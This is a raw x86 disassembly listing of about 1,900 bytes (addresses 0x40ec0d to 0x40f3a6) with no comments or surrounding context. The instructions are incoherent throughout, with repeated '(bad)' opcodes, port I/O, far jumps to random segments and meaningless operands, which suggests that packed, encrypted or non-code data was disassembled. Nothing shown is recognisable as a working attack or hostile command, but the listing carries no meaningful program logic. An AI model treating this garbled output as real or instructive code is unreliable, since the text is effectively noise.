  40ec0d:	mov    ds:0x571efa1c,eax
  40ec12:	aam    0x7f
  40ec14:	ja     0x40ec26
  40ec16:	test   eax,0x1ffc80e7
  40ec1b:	shl    al,1
  40ec1d:	rcr    BYTE PTR [ebp+0x42],1
  40ec20:	(bad)  
  40ec21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ec22:	lds    ebx,FWORD PTR [edx+0x7737b82b]
  40ec28:	mov    esp,0x5aff02c3
  40ec2d:	mov    BYTE PTR [edx+0x5f6575cd],bl
  40ec33:	xor    DWORD PTR [eax-0x3a],ebp
  40ec36:	cld    
  40ec37:	in     al,dx
  40ec38:	ret    
  40ec39:	and    BYTE PTR [ecx],cl
  40ec3b:	inc    ebp
  40ec3c:	fisttp QWORD PTR [ebx+eiz*1+0x5f]
  40ec40:	ficom  DWORD PTR [ecx-0x6f]
  40ec43:	push   esi
  40ec44:	pop    ebp
  40ec45:	jo     0x40ec5b
  40ec47:	addr16 nop
  40ec49:	fwait
  40ec4a:	stc    
  40ec4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ec4c:	add    DWORD PTR [eax],0xffffffd3
  40ec4f:	cwde   
  40ec50:	fisttp DWORD PTR [esi]
  40ec52:	cs test al,0x40
  40ec55:	push   ebx
  40ec56:	push   esp
  40ec57:	and    dl,BYTE PTR [edx+0x66a28355]
  40ec5d:	mov    eax,0x6afab1f9
  40ec62:	dec    esi
  40ec63:	xor    DWORD PTR [esi-0x7858fff3],eax
  40ec69:	(bad)  
  40ec6a:	dec    eax
  40ec6b:	fimul  DWORD PTR [ecx-0x28c345b1]
  40ec71:	bound  edx,QWORD PTR [ebx-0x4388b0cb]
  40ec77:	jp     0x40ec9b
  40ec79:	add    BYTE PTR [edi-0x244b7de0],ah
  40ec7f:	jmp    0x99d8e608
  40ec84:	rcr    BYTE PTR [ecx+0x5ee68423],1
  40ec8a:	popf   
  40ec8b:	push   eax
  40ec8c:	(bad)  
  40ec8d:	retf   
  40ec8e:	mov    edx,DWORD PTR [edi+0xa]
  40ec91:	sti    
  40ec92:	sub    eax,DWORD PTR [ebx+0x9]
  40ec95:	add    BYTE PTR [edx+0x22ea649d],dl
  40ec9b:	(bad)  
  40ec9c:	(bad)  
  40ec9d:	adc    dl,ah
  40ec9f:	push   ebp
  40eca0:	add    ch,BYTE PTR [edx]
  40eca2:	xchg   ebx,eax
  40eca3:	out    dx,al
  40eca4:	loope  0x40ecd4
  40eca6:	and    DWORD PTR [eax+esi*2-0x3d],0xffffffa2
  40ecab:	pusha  
  40ecac:	and    eax,0xd7d39eef
  40ecb1:	push   esi
  40ecb2:	inc    esp
  40ecb3:	ret    
  40ecb4:	xchg   ebx,eax
  40ecb5:	sbb    al,0x6b
  40ecb7:	push   ss
  40ecb8:	iret   
  40ecb9:	xor    eax,0xdbfecbd4
  40ecbe:	xchg   esp,eax
  40ecbf:	add    al,0xf6
  40ecc1:	jno    0x40eceb
  40ecc3:	xor    al,BYTE PTR [edi]
  40ecc5:	shl    BYTE PTR [esi-0x4d],cl
  40ecc8:	sub    BYTE PTR [eax-0x31f0039e],ah
  40ecce:	mov    BYTE PTR [esi-0x5f641b17],bh
  40ecd4:	jl     0x40ec74
  40ecd6:	and    ecx,DWORD PTR [ebx-0x10753e6f]
  40ecdc:	pop    ds
  40ecdd:	loope  0x40ed1c
  40ecdf:	cli    
  40ece0:	jmp    0x40ed55
  40ece2:	inc    ecx
  40ece3:	imul   edi,esp,0xfcd15627
  40ece9:	ds icebp 
  40eceb:	pop    ebx
  40ecec:	mov    eax,0xa25e133
  40ecf1:	sub    bh,bh
  40ecf3:	test   BYTE PTR [ebx-0x17],ah
  40ecf6:	ret    
  40ecf7:	(bad)  
  40ecf9:	pop    ds
  40ecfa:	mov    bh,0x49
  40ecfc:	pop    ebx
  40ecfd:	shr    DWORD PTR [ecx+0x40],cl
  40ed00:	pop    ds
  40ed01:	mov    dl,0x6d
  40ed03:	mov    ?,WORD PTR [eax]
  40ed05:	lahf   
  40ed06:	xchg   ecx,eax
  40ed07:	sub    eax,0x31977fcd
  40ed0c:	and    eax,0x93f24399
  40ed11:	and    ebx,DWORD PTR [edx+0x625a4160]
  40ed17:	ret    
  40ed18:	add    eax,0x4bb5b2de
  40ed1d:	adc    DWORD PTR ds:0xcb9545a0,ebp
  40ed23:	pop    eax
  40ed24:	inc    ebp
  40ed25:	xchg   DWORD PTR [ecx+0x476a82c9],ebp
  40ed2b:	jmp    0xe44f81dc
  40ed30:	cdq    
  40ed31:	stc    
  40ed32:	add    dl,BYTE PTR [ebx+0x66335218]
  40ed38:	mov    es,WORD PTR [esi]
  40ed3a:	stos   BYTE PTR es:[di],al
  40ed3c:	xchg   BYTE PTR [edi],cl
  40ed3e:	and    BYTE PTR [edi+0x19fb6645],ch
  40ed44:	xchg   esi,eax
  40ed45:	sbb    BYTE PTR [ebp-0x7],ch
  40ed48:	jp     0x40ed31
  40ed4a:	dec    edx
  40ed4b:	out    0x28,al
  40ed4d:	ins    BYTE PTR es:[edi],dx
  40ed4e:	xchg   edi,eax
  40ed4f:	pop    edi
  40ed50:	mov    BYTE PTR [edx],cl
  40ed52:	xor    al,0x30
  40ed54:	in     al,dx
  40ed55:	pushf  
  40ed56:	jl     0x40ecf9
  40ed58:	fs ins DWORD PTR es:[edi],dx
  40ed5a:	sub    BYTE PTR [ebp+0x2260ad21],ah
  40ed60:	ror    esi,cl
  40ed62:	push   edx
  40ed63:	inc    ebp
  40ed64:	sub    BYTE PTR [eax],al
  40ed66:	cmp    DWORD PTR [ebx],edi
  40ed68:	or     esi,DWORD PTR [esi-0x5a]
  40ed6b:	cdq    
  40ed6c:	les    esi,FWORD PTR [ecx-0x56939a8e]
  40ed72:	(bad)  
  40ed73:	sbb    DWORD PTR [eax+ebp*8],esi
  40ed76:	pop    ebp
  40ed77:	fwait
  40ed78:	je     0x40ed85
  40ed7a:	cwde   
  40ed7b:	ret    
  40ed7c:	nop
  40ed7d:	jae    0x40ed37
  40ed7f:	jge    0x40ed8c
  40ed81:	push   ds
  40ed82:	mov    edx,0x9b931024
  40ed87:	shl    DWORD PTR [ecx],0x8a
  40ed8a:	ret    
  40ed8b:	sub    BYTE PTR [edi+ecx*2+0x5bb42763],bh
  40ed92:	pop    ss
  40ed93:	mov    ebp,0xf7d43a77
  40ed98:	push   edx
  40ed99:	loope  0x40ee19
  40ed9b:	push   edi
  40ed9c:	push   0x37
  40ed9e:	out    dx,al
  40ed9f:	popf   
  40eda0:	dec    edx
  40eda1:	(bad)  
  40eda2:	cli    
  40eda3:	push   ebp
  40eda4:	xor    bl,BYTE PTR [ebp-0xf]
  40eda7:	fs daa 
  40eda9:	push   0xffffffd1
  40edab:	mov    esi,0x4245e361
  40edb0:	cmp    bh,al
  40edb2:	clc    
  40edb3:	dec    edi
  40edb4:	inc    edx
  40edb5:	mov    bl,0xac
  40edb7:	jmp    0xefaa:0x8c66c055
  40edbe:	dec    edi
  40edbf:	ins    BYTE PTR es:[edi],dx
  40edc0:	xchg   esp,eax
  40edc1:	ins    DWORD PTR es:[edi],dx
  40edc2:	nop
  40edc3:	es jmp 0xf845:0x86456199
  40edcb:	jl     0x40ee00
  40edcd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40edce:	outs   dx,DWORD PTR ds:[esi]
  40edcf:	mov    edx,?
  40edd1:	xor    DWORD PTR [edi],ecx
  40edd3:	push   0x22949f9c
  40edd8:	cwde   
  40edd9:	cmp    dl,dh
  40eddb:	add    DWORD PTR [eax],ebp
  40eddd:	or     ch,BYTE PTR ds:0x6f0eb49e
  40ede3:	dec    edx
  40ede4:	imul   ebx,DWORD PTR [eax+0x65],0xaa54296c
  40edeb:	xor    ah,BYTE PTR [edi+0x34c37514]
  40edf1:	in     eax,0xb8
  40edf3:	sbb    ah,BYTE PTR gs:[ebx]
  40edf6:	xor    BYTE PTR [ebp-0x44],ah
  40edf9:	jnp    0x40eda0
  40edfb:	sahf   
  40edfc:	inc    esi
  40edfd:	test   al,0x98
  40edff:	cmp    DWORD PTR [eax],ebp
  40ee01:	push   edx
  40ee02:	popa   
  40ee03:	pop    esi
  40ee04:	pop    esp
  40ee05:	not    DWORD PTR [esi+0x7]
  40ee08:	xor    BYTE PTR ds:0x605585b5,cl
  40ee0e:	pop    edi
  40ee0f:	in     al,0x7c
  40ee11:	mov    al,ds:0xb0f95532
  40ee16:	dec    edx
  40ee17:	push   esi
  40ee18:	mov    ?,WORD PTR ds:0x82e0ca01
  40ee1e:	mov    bl,0x8b
  40ee20:	leave  
  40ee21:	jb     0x40ee54
  40ee23:	ss inc eax
  40ee25:	out    0x8f,eax
  40ee27:	push   es
  40ee28:	sar    DWORD PTR [ebx+ebp*4-0x2f3ab91c],cl
  40ee2f:	fs aad 0xcb
  40ee32:	mov    eax,ds:0x61d1b0d7
  40ee37:	mov    edx,0xe528a149
  40ee3c:	dec    eax
  40ee3d:	and    DWORD PTR [ebx],0xc71672c4
  40ee43:	ds push es
  40ee45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ee46:	fwait
  40ee47:	popa   
  40ee48:	and    al,0xda
  40ee4a:	xchg   ebx,eax
  40ee4b:	fcom   QWORD PTR [ebx]
  40ee4d:	call   0x3ca6:0xf6672357
  40ee54:	aad    0x23
  40ee56:	sbb    eax,DWORD PTR [ecx+ecx*1+0x1c4149c9]
  40ee5d:	sbb    bh,0x18
  40ee60:	rol    BYTE PTR [ebx+edi*2-0x4e],1
  40ee64:	jge    0x40edf8
  40ee66:	fdivr  DWORD PTR ds:0x7ba31596
  40ee6c:	jg     0x40ee30
  40ee6e:	retf   
  40ee6f:	xor    ebp,edx
  40ee71:	or     ah,BYTE PTR [edi+0x4c]
  40ee74:	clc    
  40ee75:	fst    QWORD PTR [edx+eiz*2+0x9]
  40ee79:	mov    esp,0xef407849
  40ee7e:	retf   0xfca4
  40ee81:	ret    0xbbc3
  40ee84:	mov    esp,0xae7af5f6
  40ee89:	rcl    BYTE PTR cs:[edx-0x648c2277],0x8c
  40ee91:	rcl    al,0xbc
  40ee94:	adc    eax,0xf9ff5da6
  40ee99:	or     esi,0xffffff96
  40ee9c:	mov    edi,0xc77e5746
  40eea1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eea2:	test   eax,0xd5fdb78e
  40eea7:	sub    eax,0x6ffbcc06
  40eeac:	lea    esp,[eax-0x80]
  40eeaf:	stc    
  40eeb0:	or     eax,0xe443eb84
  40eeb5:	sub    al,0xb7
  40eeb7:	pop    ecx
  40eeb8:	push   0xb222e7
  40eebd:	mov    edx,0xe1881e4c
  40eec2:	nop
  40eec3:	xchg   edx,eax
  40eec4:	cwde   
  40eec5:	add    eax,0x25b66121
  40eeca:	es cdq 
  40eecc:	push   cs
  40eecd:	dec    esp
  40eece:	fwait
  40eecf:	fs (bad) 
  40eed1:	pop    esp
  40eed2:	(bad)  
  40eed3:	aad    0x38
  40eed5:	call   0x7ae9:0x12991520
  40eedc:	push   esi
  40eedd:	lods   eax,DWORD PTR ds:[esi]
  40eede:	or     ebx,DWORD PTR [eax]
  40eee0:	mov    WORD PTR [esi+ecx*1+0x2e],es
  40eee4:	xor    al,0x8a
  40eee6:	mov    cl,0xce
  40eee8:	xor    edx,DWORD PTR [esi-0x1207aa0b]
  40eeee:	pusha  
  40eeef:	mov    BYTE PTR [ecx+0x5fa74fe2],dh
  40eef5:	cmp    eax,0x1389e06
  40eefa:	(bad)  
  40eefb:	es je  0x40eed2
  40eefe:	jne    0x40ef06
  40ef00:	adc    al,BYTE PTR [edx]
  40ef02:	popf   
  40ef03:	mov    al,0x6e
  40ef05:	retf   
  40ef06:	popa   
  40ef07:	or     BYTE PTR [edi-0x5a],0x96
  40ef0b:	stc    
  40ef0c:	pop    ebp
  40ef0d:	inc    ebp
  40ef0e:	sti    
  40ef0f:	gs js  0x40ef53
  40ef12:	or     DWORD PTR [eax+edx*2],esi
  40ef15:	outs   dx,DWORD PTR ds:[esi]
  40ef16:	int    0x58
  40ef18:	push   ecx
  40ef19:	imul   esp,DWORD PTR [esi+edx*1+0x7b],0x13bf931f
  40ef21:	popa   
  40ef22:	test   esp,ecx
  40ef24:	ss retf 
  40ef26:	into   
  40ef27:	jp     0x40ef3c
  40ef29:	out    0x65,eax
  40ef2b:	mov    ebx,0xed67d4d3
  40ef30:	je     0x40ef0b
  40ef32:	mov    esp,0xc16674ca
  40ef37:	adc    eax,0x71c0c8a
  40ef3c:	jo     0x40ef40
  40ef3e:	jb     0x40eef1
  40ef40:	rcl    WORD PTR ds:0x3bda5ce9,cl
  40ef47:	(bad)  
  40ef48:	fs push es
  40ef4a:	mov    al,0xc0
  40ef4c:	fwait
  40ef4d:	dec    ecx
  40ef4e:	push   cs
  40ef4f:	iret   
  40ef50:	xor    bh,al
  40ef52:	out    0xc6,eax
  40ef54:	pop    ebx
  40ef55:	add    al,0xe7
  40ef57:	cmp    DWORD PTR [ebp+0x4c],esi
  40ef5a:	cmp    DWORD PTR ds:0x928157e6,edi
  40ef60:	push   eax
  40ef61:	mov    ds:0x3a7c17a1,eax
  40ef66:	adc    eax,0xa8148a4
  40ef6b:	aad    0x2c
  40ef6d:	sub    BYTE PTR [eax+0x56],bl
  40ef70:	mov    ch,0x20
  40ef72:	std    
  40ef73:	pop    edi
  40ef74:	xchg   esi,eax
  40ef75:	(bad)  
  40ef76:	mov    eax,ds:0xfc08c0e6
  40ef7b:	and    BYTE PTR [ecx],al
  40ef7d:	fild   WORD PTR [eax+0x5479865f]
  40ef83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ef84:	iret   
  40ef85:	and    eax,0x41b5cf94
  40ef8a:	scas   eax,DWORD PTR es:[edi]
  40ef8b:	(bad)  
  40ef8c:	rol    ecx,1
  40ef8e:	xchg   esp,eax
  40ef8f:	mov    bh,0x9b
  40ef91:	mov    ebp,DWORD PTR [edx-0x47]
  40ef94:	icebp  
  40ef95:	add    eax,0x402f20d6
  40ef9a:	mov    eax,0x7080c7f
  40ef9f:	test   al,0xf6
  40efa1:	idiv   BYTE PTR [edi]
  40efa3:	and    eax,0x157da467
  40efa8:	or     esi,ebx
  40efaa:	outs   dx,BYTE PTR ds:[esi]
  40efab:	inc    esp
  40efac:	out    0x53,al
  40efae:	enter  0x7365,0x6c
  40efb2:	test   DWORD PTR [ecx-0x50],ebx
  40efb5:	jp     0x40f028
  40efb7:	fidivr DWORD PTR [ecx]
  40efb9:	stos   BYTE PTR es:[edi],al
  40efba:	mov    esp,0xc5087397
  40efbf:	add    eax,0xdeaf5f97
  40efc4:	pop    es
  40efc5:	add    al,0x88
  40efc7:	mov    edi,0x23c6c291
  40efcc:	mov    esp,0xcde9e3cb
  40efd1:	fsubr  st(0),st
  40efd3:	mov    WORD PTR [edx],?
  40efd5:	pop    ds
  40efd6:	stc    
  40efd7:	int3   
  40efd8:	je     0x40ef62
  40efda:	mov    ?,WORD PTR [eax-0x7932bef9]
  40efe0:	nop
  40efe1:	xchg   DWORD PTR [edx-0x1b],ecx
  40efe4:	(bad)  
  40efe5:	pop    eax
  40efe6:	jge    0x40f04c
  40efe8:	cmp    esi,DWORD PTR [edi]
  40efea:	repnz pop esi
  40efec:	ins    DWORD PTR es:[edi],dx
  40efed:	aaa    
  40efee:	push   esi
  40eff0:	xor    ebp,DWORD PTR [ecx-0x5b8d3e1]
  40eff6:	mov    ebp,0xff5c381
  40effb:	mov    ebx,0xb4f61958
  40f000:	and    al,0xc0
  40f002:	lds    ebp,FWORD PTR fs:[eax-0x4b]
  40f006:	loope  0x40f029
  40f008:	sahf   
  40f009:	pop    ebx
  40f00a:	dec    ebp
  40f00b:	xor    eax,0x64d71164
  40f010:	and    DWORD PTR [ebp-0x29],edi
  40f013:	mov    dh,0x62
  40f015:	lahf   
  40f016:	or     cl,ah
  40f018:	cmp    ebx,eax
  40f01a:	and    eax,0x3abbf391
  40f01f:	stc    
  40f020:	hlt    
  40f021:	out    dx,al
  40f022:	fwait
  40f023:	and    eax,0x4bfa123f
  40f028:	aaa    
  40f029:	pop    eax
  40f02a:	pop    ebp
  40f02b:	adc    al,bl
  40f02d:	outs   dx,DWORD PTR ds:[esi]
  40f02e:	push   ss
  40f02f:	in     al,0x71
  40f031:	cwde   
  40f032:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f033:	jmp    0x81b92022
  40f038:	icebp  
  40f039:	push   eax
  40f03a:	aad    0x63
  40f03c:	test   eax,esp
  40f03e:	push   ds
  40f03f:	int    0x99
  40f041:	(bad)  
  40f042:	jno    0x40efff
  40f044:	xor    al,0xf9
  40f046:	addr16 mov esi,0x8041271f
  40f04c:	mov    ch,0x6f
  40f04e:	icebp  
  40f04f:	mov    eax,0x3eb09e33
  40f054:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f055:	(bad)  
  40f056:	enter  0xeab9,0x68
  40f05a:	pop    ebp
  40f05b:	push   es
  40f05c:	(bad)  
  40f05d:	mov    ecx,0x5731f7bc
  40f062:	mov    edi,0x8be98c7
  40f067:	jle    0x40f0aa
  40f069:	jl     0x40f02b
  40f06b:	or     BYTE PTR [eax+0x668dc97c],ah
  40f071:	popa   
  40f072:	dec    ecx
  40f073:	int3   
  40f074:	not    dh
  40f076:	mul    ah
  40f078:	shl    DWORD PTR [ecx+0x73],0x5d
  40f07c:	rcr    BYTE PTR [ebx+0x5c73cb3a],0xfc
  40f083:	dec    ecx
  40f084:	gs dec edi
  40f086:	popf   
  40f087:	inc    ecx
  40f088:	or     ebp,ebp
  40f08a:	xlat   BYTE PTR ds:[ebx]
  40f08b:	test   BYTE PTR [eax+0x4e],dh
  40f08e:	cmp    edi,eax
  40f090:	jp     0x40f047
  40f092:	add    bl,dh
  40f094:	shr    bh,1
  40f096:	popf   
  40f097:	push   edx
  40f098:	add    dl,BYTE PTR ds:0x47ff8b13
  40f09e:	mov    ebx,0x6c192644
  40f0a3:	stc    
  40f0a4:	mov    ecx,0xc3c38a85
  40f0a9:	or     al,dh
  40f0ab:	sbb    BYTE PTR [edi],bh
  40f0ad:	jl     0x40f09f
  40f0af:	(bad)  
  40f0b0:	cmp    eax,0xd2446cea
  40f0b5:	dec    edi
  40f0b6:	cmp    al,0x5b
  40f0b8:	mov    esp,0x57832d96
  40f0bd:	push   esi
  40f0be:	or     DWORD PTR [esi-0x58],ebx
  40f0c1:	inc    esp
  40f0c2:	into   
  40f0c3:	inc    ebx
  40f0c4:	adc    BYTE PTR [esi-0x3d],dh
  40f0c7:	sbb    dh,BYTE PTR [esi+0x18d0e951]
  40f0cd:	xchg   edi,eax
  40f0ce:	adc    al,0x5c
  40f0d0:	and    al,0x81
  40f0d2:	fidivr WORD PTR [ecx+0x2d]
  40f0d5:	xchg   DWORD PTR [ebx+0x7f],ecx
  40f0d8:	adc    DWORD PTR [ecx-0x9978544],0xffffff8a
  40f0df:	popf   
  40f0e0:	fmul   DWORD PTR [edi+0x1f05113]
  40f0e6:	add    al,BYTE PTR [ecx-0x346e304d]
  40f0ec:	cmp    ebx,esi
  40f0ee:	or     cl,0xf3
  40f0f1:	mov    bh,0x16
  40f0f3:	loopne 0x40f089
  40f0f5:	pop    ebx
  40f0f6:	mov    eax,ss
  40f0f8:	loopne 0x40f13e
  40f0fa:	cs jne 0x40f0cd
  40f0fd:	mov    esp,0xee1cc790
  40f102:	jp     0x40f0be
  40f104:	push   es
  40f105:	imul   ebx,DWORD PTR [ebx-0x3b10f171],0xffffffd9
  40f10c:	inc    eax
  40f10d:	xchg   esi,eax
  40f10e:	adc    ch,BYTE PTR [eax-0x1d]
  40f111:	or     ebp,DWORD PTR [edi+ebx*4-0x108f42d6]
  40f118:	cmc    
  40f119:	adc    cl,BYTE PTR [ebp-0x43cafed5]
  40f11f:	sbb    bh,al
  40f121:	arpl   WORD PTR [ecx-0x15],dx
  40f124:	sbb    BYTE PTR [edx+0x45c52022],cl
  40f12a:	push   ss
  40f12b:	cvtps2pd xmm7,QWORD PTR [esi+0x730750f8]
  40f132:	arpl   WORD PTR [eax+0x7a],ax
  40f135:	adc    al,0xe2
  40f137:	mov    esp,0x4ae1f372
  40f13c:	ficom  WORD PTR [esi-0x999759]
  40f142:	add    edx,DWORD PTR [ebp+0x65f15964]
  40f148:	pop    edx
  40f149:	mov    WORD PTR [ebx+eiz*8+0x6c],es
  40f14d:	test   ebp,eax
  40f14f:	sub    BYTE PTR [ebp+0x58],al
  40f152:	inc    esp
  40f153:	std    
  40f154:	jmp    0x40f194
  40f156:	mov    BYTE PTR [ebx],bl
  40f158:	inc    edx
  40f159:	test   al,0x7a
  40f15b:	or     ecx,DWORD PTR [eax]
  40f15d:	push   0xb5c831af
  40f162:	nop
  40f163:	add    ebp,DWORD PTR [eax+0x15]
  40f166:	cmp    al,0x3e
  40f168:	mov    esi,DWORD PTR [edx-0x64]
  40f16b:	pop    ds
  40f16c:	adc    DWORD PTR [ebx-0x1661aee7],ebp
  40f172:	push   ebx
  40f173:	stos   BYTE PTR es:[edi],al
  40f174:	shr    DWORD PTR [edi+0x3a],cl
  40f177:	shl    al,1
  40f179:	inc    esi
  40f17a:	mov    eax,ds:0x2703f6d2
  40f17f:	jns    0x40f1a0
  40f181:	dec    ecx
  40f182:	cmp    ch,BYTE PTR [edi-0x72244417]
  40f188:	repz dec ebp
  40f18a:	aaa    
  40f18b:	inc    ebx
  40f18c:	mov    al,ds:0xea314c96
  40f191:	sub    ebx,DWORD PTR ds:0xe7790341
  40f197:	out    dx,al
  40f198:	ins    DWORD PTR es:[edi],dx
  40f199:	xlat   BYTE PTR ds:[ebx]
  40f19a:	lock ja 0x40f188
  40f19d:	cli    
  40f19e:	xchg   esp,eax
  40f19f:	xlat   BYTE PTR ds:[ebx]
  40f1a0:	(bad)  
  40f1a1:	(bad)  
  40f1a2:	(bad)  
  40f1a3:	out    dx,al
  40f1a4:	enter  0xd5d3,0xa2
  40f1a8:	retf   
  40f1a9:	sbb    eax,0x20f4abe0
  40f1ae:	mov    ecx,0x349fe45f
  40f1b3:	mov    ch,0x30
  40f1b5:	mov    eax,ds:0x784b9bd5
  40f1ba:	shr    ecx,1
  40f1bc:	mov    ah,0x0
  40f1be:	and    cl,BYTE PTR ds:0x7e2b42aa
  40f1c4:	add    eax,0xfa555458
  40f1c9:	dec    eax
  40f1ca:	mov    BYTE PTR [ebx+0x7c],ch
  40f1cd:	mov    edx,0xc6d81d5c
  40f1d2:	xchg   DWORD PTR [edx+0x4a],edx
  40f1d5:	cdq    
  40f1d6:	inc    edx
  40f1d7:	cmp    al,0x9f
  40f1d9:	jle    0x40f247
  40f1db:	rcr    BYTE PTR [eax-0x5dca71c5],cl
  40f1e1:	mov    esp,DWORD PTR [ecx]
  40f1e3:	dec    ebx
  40f1e4:	in     eax,0x51
  40f1e6:	pusha  
  40f1e7:	shr    BYTE PTR [ecx-0x56a33da4],1
  40f1ed:	inc    esi
  40f1ee:	inc    ecx
  40f1ef:	jl     0x40f189
  40f1f1:	mov    esi,ds
  40f1f3:	pop    ds
  40f1f4:	xchg   ah,ch
  40f1f6:	mov    ebp,DWORD PTR [esi+0x4d]
  40f1f9:	add    ecx,DWORD PTR [ebx+0x6311325e]
  40f1ff:	pop    esi
  40f200:	call   0x729e:0x912aeae1
  40f207:	mov    al,ds:0xfd0f88ff
  40f20c:	fcomp  st(5)
  40f20e:	aaa    
  40f20f:	loope  0x40f1c8
  40f211:	ret    0x272b
  40f214:	data16 rcr ah,0x47
  40f218:	push   ds
  40f219:	jl     0x40f1fb
  40f21b:	fsubr  DWORD PTR [ecx]
  40f21d:	mov    esp,DWORD PTR [edx+0x2c]
  40f220:	xchg   edx,eax
  40f221:	add    eax,0x3282c1d9
  40f226:	add    ch,BYTE PTR fs:[ecx+0x6b]
  40f22a:	loope  0x40f262
  40f22c:	mov    dh,0x60
  40f22e:	rcr    DWORD PTR [ebp-0x54],cl
  40f231:	call   0xde0f:0xf4b30ad3
  40f238:	mov    DWORD PTR [esi-0x2f],ebp
  40f23b:	inc    eax
  40f23c:	dec    ebx
  40f23d:	or     al,ah
  40f23f:	out    0xa8,eax
  40f241:	popa   
  40f242:	test   al,0x22
  40f244:	sbb    eax,0x42f4cdf0
  40f249:	rcl    DWORD PTR [edx+0x37e2a6c2],cl
  40f24f:	sti    
  40f250:	loopne 0x40f213
  40f252:	push   cs
  40f253:	out    dx,al
  40f254:	lods   al,BYTE PTR ds:[esi]
  40f255:	inc    eax
  40f256:	dec    esi
  40f257:	shl    BYTE PTR [esi+0x269328],cl
  40f25d:	ins    DWORD PTR es:[edi],dx
  40f25e:	fmul   st,st(0)
  40f260:	adc    eax,0x76e6849
  40f265:	sub    al,0x71
  40f267:	int3   
  40f268:	aad    0x79
  40f26a:	push   es
  40f26b:	retf   0xce17
  40f26e:	or     BYTE PTR [esi+0x1],dh
  40f271:	fs stos BYTE PTR es:[edi],al
  40f273:	jbe    0x40f223
  40f275:	and    ebx,esp
  40f277:	inc    esi
  40f278:	stos   DWORD PTR es:[edi],eax
  40f279:	in     al,0x6a
  40f27b:	and    al,0xe
  40f27d:	xor    eax,0xa6c93313
  40f282:	ja     0x40f25f
  40f284:	push   ds
  40f285:	in     al,0x8c
  40f287:	jb     0x40f276
  40f289:	push   edi
  40f28a:	mov    ch,0xc8
  40f28c:	shl    BYTE PTR [ebx+0x4e8eded3],0x96
  40f293:	fs inc edi
  40f295:	fild   WORD PTR [eax+edx*2-0x8810d06]
  40f29c:	push   ss
  40f29d:	test   al,0x64
  40f29f:	xchg   edi,eax
  40f2a0:	or     DWORD PTR [eax-0x8e3c367],edx
  40f2a6:	add    DWORD PTR [ebp+esi*2+0x1f],eax
  40f2aa:	jae    0x40f234
  40f2ac:	xor    ecx,ebx
  40f2ae:	sbb    al,0xe6
  40f2b0:	sub    edx,DWORD PTR [edi+0x23]
  40f2b3:	pop    ss
  40f2b4:	ja     0x40f258
  40f2b6:	mov    cl,0x87
  40f2b8:	nop
  40f2b9:	cmp    DWORD PTR [edi+0x2ac0aa1f],edx
  40f2bf:	xchg   ecx,eax
  40f2c0:	mov    gs,WORD PTR ds:0xc7082a58
  40f2c6:	icebp  
  40f2c7:	or     ah,bl
  40f2c9:	nop
  40f2ca:	and    BYTE PTR [esi+ebx*2-0x1025b02f],al
  40f2d1:	pusha  
  40f2d2:	mov    ecx,0x37b49092
  40f2d7:	xchg   ecx,eax
  40f2d9:	cmc    
  40f2da:	loope  0x40f25d
  40f2dc:	pop    ebp
  40f2dd:	mov    DWORD PTR [si],eax
  40f2e0:	lea    eax,[edi-0x2d43159e]
  40f2e6:	out    dx,eax
  40f2e7:	cmc    
  40f2e8:	adc    BYTE PTR [eax+0x3f],dh
  40f2eb:	and    eax,ebp
  40f2ed:	fsubr  DWORD PTR [ebx-0x59]
  40f2f0:	xchg   ecx,eax
  40f2f1:	push   0x97e0cd9b
  40f2f6:	xchg   ebx,eax
  40f2f7:	out    dx,al
  40f2f8:	dec    esi
  40f2f9:	mov    esi,0xcabbe2b6
  40f2fe:	push   ds
  40f2ff:	xchg   DWORD PTR [eax-0x61e382a],ebp
  40f305:	jge    0x40f374
  40f307:	icebp  
  40f308:	xor    al,0x35
  40f30a:	popa   
  40f30b:	retf   
  40f30c:	stc    
  40f30d:	aam    0x8f
  40f30f:	daa    
  40f310:	lock inc esi
  40f312:	pop    eax
  40f313:	rol    BYTE PTR [ecx+eax*2],cl
  40f316:	and    eax,0xf5234e28
  40f31b:	sar    BYTE PTR [eax-0x6851a00e],cl
  40f321:	fwait
  40f322:	push   ebp
  40f323:	mov    dl,ah
  40f325:	ret    0xc5df
  40f328:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f329:	test   eax,0x828dc1f3
  40f32e:	aad    0x10
  40f330:	or     cl,BYTE PTR [ecx-0x5b3983b5]
  40f336:	dec    edi
  40f337:	out    dx,al
  40f338:	jnp    0x40f35b
  40f33a:	or     ch,BYTE PTR [edi+0x69b59e24]
  40f340:	dec    ecx
  40f341:	hlt    
  40f342:	sbb    BYTE PTR [ecx],dh
  40f344:	mov    BYTE PTR [ebx+0x14f52546],dh
  40f34a:	and    al,0xc4
  40f34c:	xor    dh,al
  40f34e:	mov    ds:0x8d7e5ba1,eax
  40f353:	dec    ecx
  40f354:	push   esi
  40f355:	ins    DWORD PTR es:[edi],dx
  40f356:	rol    DWORD PTR [ebp+0x46],1
  40f359:	dec    esp
  40f35a:	ss dec eax
  40f35c:	xor    edx,DWORD PTR [eax]
  40f35e:	cmp    al,0xc7
  40f360:	mov    ebp,0x4e577ef6
  40f365:	add    DWORD PTR [esi-0x15c189e7],ecx
  40f36b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f36c:	add    esp,ebx
  40f36e:	fisub  WORD PTR [esi+0x157c7aaf]
  40f374:	jge    0x40f399
  40f376:	inc    edi
  40f377:	arpl   WORD PTR [ebp+0x2c],di
  40f37a:	push   0xcd931f2e
  40f37f:	sub    DWORD PTR [eax],ebx
  40f381:	cli    
  40f382:	mov    cl,0x1
  40f384:	enter  0xdcc9,0xb8
  40f388:	pushf  
  40f389:	sahf   
  40f38a:	and    dl,BYTE PTR [ecx+esi*4-0x1e]
  40f38e:	push   0xb238aeaf
  40f393:	inc    ebx
  40f394:	(bad)  
  40f395:	aas    
  40f396:	adc    esi,edi
  40f398:	or     BYTE PTR [edi+0x18],bh
  40f39b:	imul   esi,DWORD PTR [edx+edx*2+0x6e10e4ef],0xfffffff1
  40f3a3:	inc    BYTE PTR [esi+0x13]
  40f3a6:	sbb    BYTE PTR [esi+edx*4-0x3bf9f389],cl
